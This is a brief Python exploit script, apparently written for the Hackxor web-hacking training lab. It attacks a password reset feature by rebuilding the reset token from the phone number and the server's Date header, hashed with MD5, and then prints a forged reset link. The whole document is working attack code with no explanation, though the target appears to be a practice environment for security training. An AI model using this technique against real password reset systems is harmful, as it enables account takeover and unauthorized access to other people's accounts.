import requests
import hashlib
from datetime import datetime, timedelta
from email.utils import parsedate

phone = '01563482431'

resp = requests.post('http://phonecorp.hackxor.net/reset', data={'phone': phone})

date = parsedate(resp.headers['Date'])[:6]

epoch = (datetime(*date)-datetime(1970, 1, 1)).total_seconds()

token = hashlib.md5((phone+'|'+str(int(epoch))).encode()).hexdigest()

print('[+] password reset link: http://phonecorp.hackxor.net/reset?reset_token={}'.format(token))